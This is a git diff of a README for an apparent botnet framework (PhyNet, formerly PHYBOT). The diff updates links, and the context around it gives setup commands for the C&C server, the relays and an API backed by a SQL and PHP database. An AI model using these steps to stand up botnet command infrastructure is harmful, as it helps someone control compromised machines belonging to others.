@@ -7,19 +7,19 @@ Def: "Command and Control" (C&C) servers are centralized machines that are able 
 
 My cnc works with a relay (which will relay the commands to the bots to avoid an overload of the cnc server), it also works with an api which will be mainly used to register the relay servers to be able to dispatch the bots on the server having the least load, the api will also be used to login on the cnc
 
-for setup the [cnc](https://github.com/4lxprime/PHYBOT/blob/main/SERVER/cnc.py):  
+for setup the [cnc](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/cnc.py):  
 ```batch
 py cnc.py 8080    
 ```
 
 # RELAY
-for setup the [relay](https://github.com/4lxprime/PHYBOT/blob/main/SERVER/relay.py):  
+for setup the [relay](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/relay.py):  
 ```batch
 py relay.py 5000
 ```
 
 # API
-for setup the [api](https://github.com/4lxprime/PHYBOT/tree/main/SERVER/api/v1), you need a database:
+for setup the [api](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2), you need a database:
 ## API Database:
 ```sql
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
@@ -76,8 +76,8 @@ function create_acc($usr, $pass) {
 
 }
 ```
-Next, you need an php server for copy the api file ([SERVER/api/v1](https://github.com/4lxprime/PHYBOT/tree/main/SERVER/api/v1))  
-After you have to configure the database in the php script ([SERVER/api/v1/db_conn/db_connn.php](https://github.com/4lxprime/PHYBOT/blob/main/SERVER/api/v1/db/db_conn.php))  
+Next, you need an php server for copy the api file ([SERVER/api/v1](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2))  
+After you have to configure the database in the php script ([SERVER/api/v1/db_conn/db_connn.php](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2/db/db_conn.php))  
 ```php
 $sname="localhost"; //database address
 $unmae="root"; //database username
